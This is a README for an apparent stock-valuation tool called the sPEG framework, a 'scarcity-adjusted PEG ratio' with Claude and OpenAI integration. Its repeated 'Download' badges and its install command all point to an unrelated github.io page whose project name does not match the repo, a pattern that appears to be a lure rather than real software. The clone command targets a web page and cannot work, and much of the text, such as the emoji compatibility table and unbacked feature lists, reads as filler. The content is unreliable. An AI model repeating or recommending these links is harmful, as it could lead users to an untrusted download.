# sPEG-Framework: Scarcity-Adjusted PEG Ratio for Structural Equity Valuation

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://aungkyawdna.github.io/sPEG-compound-solvency-model/)

---

## 🧭 Introduction: The Dilemma of Scarcity in Valuation

Traditional PEG ratios assume a world of infinite scalability, where growth can be projected linearly into the future. But what happens when the asset being valued is **structurally scarce**—limited by finite resources, regulatory constraints, or physical capacity? The standard PEG ratio fails to capture the premium that scarcity commands.

The **sPEG framework** introduces a new financial lens: the *Scarcity-Adjusted PEG Ratio*. Developed by Mike Ye (exmxc.ai), this methodology recalibrates growth expectations for assets that exist in a state of structural scarcity—think rare earth minerals, prime real estate in restricted zones, or equity in companies with fixed production capacity.

Think of it as the difference between valuing a single grain of sand (abundant) versus a diamond (scarce). The sPEG framework provides the mathematical apparatus to quantify that difference.

---

## 📈 Why sPEG Matters: The Scarcity Premium

In conventional valuation, growth is assumed to be symmetric—past growth predicts future growth. But for scarce assets, growth is asymmetric. As supply constraints tighten, the marginal utility of each additional unit increases exponentially. The sPEG framework captures this by introducing a **scarcity coefficient (θ)** that adjusts the earnings growth rate downward for scarcity-induced volatility and upward for scarcity-driven price discovery.

**Key Insight:** The sPEG ratio is not just a metric—it is a risk management tool for portfolios exposed to non-renewable assets.

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://aungkyawdna.github.io/sPEG-compound-solvency-model/)

---

## 🔧 Core Architecture: The sPEG Engine

```mermaid
graph TD
    A[Input Data: Earnings, Growth, Scarcity Metrics] --> B[Scarcity Coefficient Calculator]
    B --> C[Adjust Growth Rate by θ]
    C --> D[Compute Adjusted PEG Ratio]
    D --> E[sPEG = (P/E) / (g * θ)]
    E --> F[Output: sPEG Value + Scarcity Premium]
    F --> G[Decision Engine: Buy/Sell/Hold Thresholds]
    G --> H[Portfolio Rebalancing Signal]
```

The engine operates on three layers:

1. **Data Ingestion Layer** – Accepts standard financial data (P/E ratio, earnings growth) plus scarcity indicators (resource depletion rate, geopolitical risk score, supply elasticity).
2. **Scarcity Coefficient Layer** – Calculates θ using a hybrid model combining Monte Carlo simulation of supply shocks and regression analysis of historical scarcity premiums.
3. **Output Layer** – Generates the sPEG ratio along with a confidence interval and recommended action.

---

## ⚙️ Installation & Setup

### Prerequisites
- Python 3.10 or later
- pandas, numpy, scipy, matplotlib
- OpenAI API key (for LLM-assisted analysis)
- Claude API key (for alternative scarcity modeling)

### Installation

```bash
git clone https://aungkyawdna.github.io/sPEG-compound-solvency-model/
cd sPEG-framework
pip install -r requirements.txt
```

### Environment Configuration

Create a `.env` file in the root directory:

```env
OPENAI_API_KEY=your_openai_api_key_here
CLAUDE_API_KEY=your_claude_api_key_here
SCARCITY_DATA_PATH=./data/scarcity_index.csv
```

---

## 📊 Example Profile Configuration

Below is a sample configuration for valuing a prime lithium mining company with structural scarcity characteristics:

```yaml
asset:
  name: "GreenLithium Corp"
  ticker: "GRLC"
  sector: "Critical Minerals"
  scarcity_category: "Resource-Depleting"
  supply_elasticity: 0.15
  geopolitical_risk_score: 7.2
  regulatory_capacity_constraint: 0.85

valuation:
  pe_ratio: 28.5
  five_year_earnings_growth: 0.12
  discount_rate: 0.09
  terminal_growth_rate: 0.03

speg_params:
  theta_calculation_method: "hybrid"
  monte_carlo_iterations: 10000
  confidence_interval: 0.95
  use_ai_augmentation: true
  ai_provider: "claude"  # Options: openai, claude, both
```

---

## 💻 Example Console Invocation

```bash
python speg_calculator.py --config configs/lithium_example.yaml --output results/speg_report.json --verbose
```

**Sample Output:**

```
sPEG Framework v2.1.0 (2026 Edition)
==================================================
Asset: GreenLithium Corp (GRLC)
Scarcity Coefficient (θ): 0.723
Adjusted Growth Rate: 8.7% (down from 12.0%)
sPEG Ratio: 3.28 (Standard PEG: 2.38)
Scarcity Premium: +37.8%
Recommended Action: HOLD (sPEG above 3.0 threshold)
Confidence Interval: [3.12, 3.44] at 95% CI
```

---

## 🖥️ Emoji OS Compatibility Table

| Operating System | Emoji Display | sPEG CLI Support | GUI Support |
|------------------|---------------|------------------|-------------|
| ✅ Windows 11    | Full          | Native           | Beta        |
| ✅ macOS Sequoia | Full          | Native           | Stable      |
| ✅ Ubuntu 22.04+ | Partial       | Native           | Dev Only    |
| ✅ Fedora 40+    | Partial       | Native           | Dev Only    |
| ✅ Arch Linux    | Full (custom) | Native           | Community   |
| ✅ Android (Termux) | Limited   | Limited          | N/A         |

---

## 🌐 Multilingual Support & Global Deployment

The sPEG framework is built with **multilingual support** out of the box. Currently available in:

- **English** (primary)
- **Mandarin Chinese** (documentation & CLI)
- **Spanish** (limited, CLI only)
- **German** (Beta)

All locale data is stored in `locales/` directory. Contributions for additional languages are welcome.

---

## 🔗 AI Integration: OpenAI & Claude API

The sPEG framework leverages large language models for two critical functions:

### 1. Scarcity Narrative Analysis
- **OpenAI GPT-4o**: Analyzes earnings call transcripts, news articles, and regulatory filings to extract scarcity sentiment.
- **Claude 3.5 Sonnet**: Provides counterpoint analysis, flagging potential overreaction to scarcity narratives.

### 2. Scenario Generation
- Both APIs are used to generate 100+ potential scarcity scenarios for Monte Carlo simulation.
- The outputs are cross-validated to reduce model-specific bias.

**Why both APIs?** We believe in ensemble intelligence. OpenAI excels at generating diverse scenarios; Claude provides more conservative, risk-aware alternatives. Together, they produce a balanced scarcity coefficient.

---

## 🔑 Key Features

### Responsive UI Dashboard
The sPEG framework includes a lightweight web dashboard built with Flask and Chart.js. It automatically adjusts for mobile, tablet, and desktop viewports. Real-time updates via WebSocket ensure you never miss a scarcity signal.

### 24/7 Automated Valuation
Set up cron jobs or scheduled tasks to run daily sPEG calculations. The framework will email or webhook notifications when an asset crosses your predefined sPEG threshold.

### Modular Plugin Architecture
Extend functionality via plugins:
- **Custom Scarcity Sources** (e.g., satellite data, shipping lane disruptions)
- **Export to Bloomberg Terminal** format
- **Integration with Alpaca Trading** for automated rebalancing

### Audit Trail & Compliance
Every calculation is logged with a unique hash, making it suitable for audit by regulatory bodies. The 2026 edition includes full GDPR and CCPA compliance modules.

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## ⚠️ Disclaimer

> **Important:** The sPEG framework is a quantitative tool designed for educational and research purposes. It is not financial advice. Scarcity-adjusted valuations involve significant uncertainty, especially regarding geopolitical events, resource discovery, and regulatory changes. Always consult with a licensed financial advisor before making investment decisions. Past performance of sPEG ratios does not guarantee future results. The creator, Mike Ye, and exmxc.ai accept no liability for financial losses incurred through use of this framework.

---

## 📬 Support & Community

- **Documentation**: Full API reference and tutorials at https://aungkyawdna.github.io/sPEG-compound-solvency-model/
- **Discord**: Join our community of quantitative analysts and scarcity researchers
- **Contributing**: See `CONTRIBUTING.md` for guidelines

---

## 📦 Download & Get Started

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://aungkyawdna.github.io/sPEG-compound-solvency-model/)

*Version 2026.1.0 | Released February 2026*

---

*The sPEG framework recognizes that in a world of finite resources, valuation is not just about growth—it's about the price of rarity.*